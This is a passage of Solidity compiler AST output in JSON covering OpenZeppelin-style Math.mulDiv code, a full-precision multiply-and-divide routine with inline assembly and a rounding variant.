0"},"value":"0"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"id":2513,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"8936:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8932:15:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2515,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"8931:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"8917:31:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"8902:46:6"},{"AST":{"nativeSrc":"8987:359:6","nodeType":"YulBlock","src":"8987:359:6","statements":[{"nativeSrc":"9052:37:6","nodeType":"YulAssignment","src":"9052:37:6","value":{"arguments":[{"name":"denominator","nativeSrc":"9071:11:6","nodeType":"YulIdentifier","src":"9071:11:6"},{"name":"twos","nativeSrc":"9084:4:6","nodeType":"YulIdentifier","src":"9084:4:6"}],"functionName":{"name":"div","nativeSrc":"9067:3:6","nodeType":"YulIdentifier","src":"9067:3:6"},"nativeSrc":"9067:22:6","nodeType":"YulFunctionCall","src":"9067:22:6"},"variableNames":[{"name":"denominator","nativeSrc":"9052:11:6","nodeType":"YulIdentifier","src":"9052:11:6"}]},{"nativeSrc":"9153:21:6","nodeType":"YulAssignment","src":"9153:21:6","value":{"arguments":[{"name":"low","nativeSrc":"9164:3:6","nodeType":"YulIdentifier","src":"9164:3:6"},{"name":"twos","nativeSrc":"9169:4:6","nodeType":"YulIdentifier","src":"9169:4:6"}],"functionName":{"name":"div","nativeSrc":"9160:3:6","nodeType":"YulIdentifier","src":"9160:3:6"},"nativeSrc":"9160:14:6","nodeType":"YulFunctionCall","src":"9160:14:6"},"variableNames":[{"name":"low","nativeSrc":"9153:3:6","nodeType":"YulIdentifier","src":"9153:3:6"}]},{"nativeSrc":"9293:39:6","nodeType":"YulAssignment","src":"9293:39:6","value":{"arguments":[{"arguments":[{"arguments":[{"kind":"number","nativeSrc":"9313:1:6","nodeType":"YulLiteral","src":"9313:1:6","type":"","value":"0"},{"name":"twos","nativeSrc":"9316:4:6","nodeType":"YulIdentifier","src":"9316:4:6"}],"functionName":{"name":"sub","nativeSrc":"9309:3:6","nodeType":"YulIdentifier","src":"9309:3:6"},"nativeSrc":"9309:12:6","nodeType":"YulFunctionCall","src":"9309:12:6"},{"name":"twos","nativeSrc":"9323:4:6","nodeType":"YulIdentifier","src":"9323:4:6"}],"functionName":{"name":"div","nativeSrc":"9305:3:6","nodeType":"YulIdentifier","src":"9305:3:6"},"nativeSrc":"9305:23:6","nodeType":"YulFunctionCall","src":"9305:23:6"},{"kind":"number","nativeSrc":"9330:1:6","nodeType":"YulLiteral","src":"9330:1:6","type":"","value":"1"}],"functionName":{"name":"add","nativeSrc":"9301:3:6","nodeType":"YulIdentifier","src":"9301:3:6"},"nativeSrc":"9301:31:6","nodeType":"YulFunctionCall","src":"9301:31:6"},"variableNames":[{"name":"twos","nativeSrc":"9293:4:6","nodeType":"YulIdentifier","src":"9293:4:6"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2463,"isOffset":false,"isSlot":false,"src":"9052:11:6","valueSize":1},{"declaration":2463,"isOffset":false,"isSlot":false,"src":"9071:11:6","valueSize":1},{"declaration":2471,"isOffset":false,"isSlot":false,"src":"9153:3:6","valueSize":1},{"declaration":2471,"isOffset":false,"isSlot":false,"src":"9164:3:6","valueSize":1},{"declaration":2510,"isOffset":false,"isSlot":false,"src":"9084:4:6","valueSize":1},{"declaration":2510,"isOffset":false,"isSlot":false,"src":"9169:4:6","valueSize":1},{"declaration":2510,"isOffset":false,"isSlot":false,"src":"9293:4:6","valueSize":1},{"declaration":2510,"isOffset":false,"isSlot":false,"src":"9316:4:6","valueSize":1},{"declaration":2510,"isOffset":false,"isSlot":false,"src":"9323:4:6","valueSize":1}],"flags":["memory-safe"],"id":2518,"nodeType":"InlineAssembly","src":"8962:384:6"},{"expression":{"id":2523,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2519,"name":"low","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2471,"src":"9409:3:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2522,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2520,"name":"high","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2469,"src":"9416:4:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2521,"name":"twos","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2510,"src":"9423:4:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9416:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9409:18:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2524,"nodeType":"ExpressionStatement","src":"9409:18:6"},{"assignments":[2526],"declarations":[{"constant":false,"id":2526,"mutability":"mutable","name":"inverse","nameLocation":"9770:7:6","nodeType":"VariableDeclaration","scope":2590,"src":"9762:15:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2525,"name":"uint256","nodeType":"ElementaryTypeName","src":"9762:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2533,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2532,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2529,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"33","id":2527,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9781:1:6","typeDescriptions":{"typeIdentifier":"t_rational_3_by_1","typeString":"int_const 3"},"value":"3"},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2528,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"9785:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"9781:15:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":2530,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"9780:17:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"^","rightExpression":{"hexValue":"32","id":2531,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"9800:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"9780:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"9762:39:6"},{"expression":{"id":2540,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2534,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10018:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2539,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":2535,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10029:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2538,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2536,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"10033:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2537,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10047:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10033:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10029:25:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10018:36:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2541,"nodeType":"ExpressionStatement","src":"10018:36:6"},{"expression":{"id":2548,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2542,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10088:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2547,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":2543,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10099:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2546,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2544,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"10103:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2545,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10117:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10103:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10099:25:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10088:36:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2549,"nodeType":"ExpressionStatement","src":"10088:36:6"},{"expression":{"id":2556,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2550,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10160:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2555,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":2551,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10171:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2554,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2552,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"10175:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2553,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10189:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10175:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10171:25:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10160:36:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2557,"nodeType":"ExpressionStatement","src":"10160:36:6"},{"expression":{"id":2564,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2558,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10231:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2563,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":2559,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10242:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2562,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2560,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"10246:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2561,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10260:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10246:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10242:25:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10231:36:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2565,"nodeType":"ExpressionStatement","src":"10231:36:6"},{"expression":{"id":2572,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2566,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10304:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2571,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":2567,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10315:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2570,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2568,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"10319:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2569,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10333:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10319:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10315:25:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10304:36:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2573,"nodeType":"ExpressionStatement","src":"10304:36:6"},{"expression":{"id":2580,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2574,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10378:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"*=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2579,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":2575,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10389:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2578,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2576,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2463,"src":"10393:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2577,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10407:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10393:21:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10389:25:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10378:36:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2581,"nodeType":"ExpressionStatement","src":"10378:36:6"},{"expression":{"id":2586,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2582,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2466,"src":"10859:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2585,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2583,"name":"low","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2471,"src":"10868:3:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2584,"name":"inverse","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2526,"src":"10874:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10868:13:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10859:22:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2587,"nodeType":"ExpressionStatement","src":"10859:22:6"},{"expression":{"id":2588,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2466,"src":"10902:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2467,"id":2589,"nodeType":"Return","src":"10895:13:6"}]}]},"documentation":{"id":2457,"nodeType":"StructuredDocumentation","src":"6925:312:6","text":" @dev Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\n denominator == 0.\n Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\n Uniswap Labs also under MIT license."},"id":2592,"implemented":true,"kind":"function","modifiers":[],"name":"mulDiv","nameLocation":"7251:6:6","nodeType":"FunctionDefinition","parameters":{"id":2464,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2459,"mutability":"mutable","name":"x","nameLocation":"7266:1:6","nodeType":"VariableDeclaration","scope":2592,"src":"7258:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2458,"name":"uint256","nodeType":"ElementaryTypeName","src":"7258:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2461,"mutability":"mutable","name":"y","nameLocation":"7277:1:6","nodeType":"VariableDeclaration","scope":2592,"src":"7269:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2460,"name":"uint256","nodeType":"ElementaryTypeName","src":"7269:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2463,"mutability":"mutable","name":"denominator","nameLocation":"7288:11:6","nodeType":"VariableDeclaration","scope":2592,"src":"7280:19:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2462,"name":"uint256","nodeType":"ElementaryTypeName","src":"7280:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"7257:43:6"},"returnParameters":{"id":2467,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2466,"mutability":"mutable","name":"result","nameLocation":"7332:6:6","nodeType":"VariableDeclaration","scope":2592,"src":"7324:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2465,"name":"uint256","nodeType":"ElementaryTypeName","src":"7324:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"7323:16:6"},"scope":3686,"src":"7242:3683:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2628,"nodeType":"Block","src":"11164:128:6","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2626,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":2608,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2595,"src":"11188:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2609,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2597,"src":"11191:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2610,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2599,"src":"11194:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2607,"name":"mulDiv","nodeType":"Identifier","overloadedDeclarations":[2592,2629],"referencedDeclaration":2592,"src":"11181:6:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256,uint256,uint256) pure returns (uint256)"}},"id":2611,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11181:25:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":2624,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":2615,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2602,"src":"11242:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}],"id":2614,"name":"unsignedRoundsUp","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3685,"src":"11225:16:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_enum$_Rounding_$2077_$returns$_t_bool_$","typeString":"function (enum Math.Rounding) pure returns (bool)"}},"id":2616,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11225:26:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2623,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":2618,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2595,"src":"11262:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2619,"name":"y","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2597,"src":"11265:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":2620,"name":"denominator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2599,"src":"11268:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":2617,"name":"mulmod","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-16,"src":"11255:6:6","typeDescriptions":{"typeIdentifier":"t_function_mulmod_pure$_t_uint256_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256,uint256,uint256) pure returns (uint256)"}},"id":2621,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11255:25:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2622,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11283:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"11255:29:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"11225:59:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":2612,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"11209:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":2613,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"11218:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"11209:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":2625,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11209:76:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"11181:104:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":2606,"id":2627,"nodeType":"Return","src":"11174:111:6"}]},"documentation":{"id":2593,"nodeType":"StructuredDocumentation","src":"10931:118:6","text":" @dev Calculates x * y / denominator with full precision, following the selected rounding direction."},"id":2629,"implemented":true,"kind":"function","modifiers":[],"name":"mulDiv","nameLocation":"11063:6:6","nodeType":"FunctionDefinition","parameters":{"id":2603,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2595,"mutability":"mutable","name":"x","nameLocation":"11078:1:6","nodeType":"VariableDeclaration","scope":2629,"src":"11070:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2594,"name":"uint256","nodeType":"ElementaryTypeName","src":"11070:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2597,"mutability":"mutable","name":"y","nameLocation":"11089:1:6","nodeType":"VariableDeclaration","scope":2629,"src":"11081:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2596,"name":"uint256","nodeType":"ElementaryTypeName","src":"11081:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2599,"mutability":"mutable","name":"denominator","nameLocation":"11100:11:6","nodeType":"VariableDeclaration","scope":2629,"src":"11092:19:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2598,"name":"uint256","nodeType":"ElementaryTypeName","src":"11092:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2602,"mutability":"mutable","name":"rounding","nameLocation":"11122:8:6","nodeType":"VariableDeclaration","scope":2629,"src":"11113:17:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum 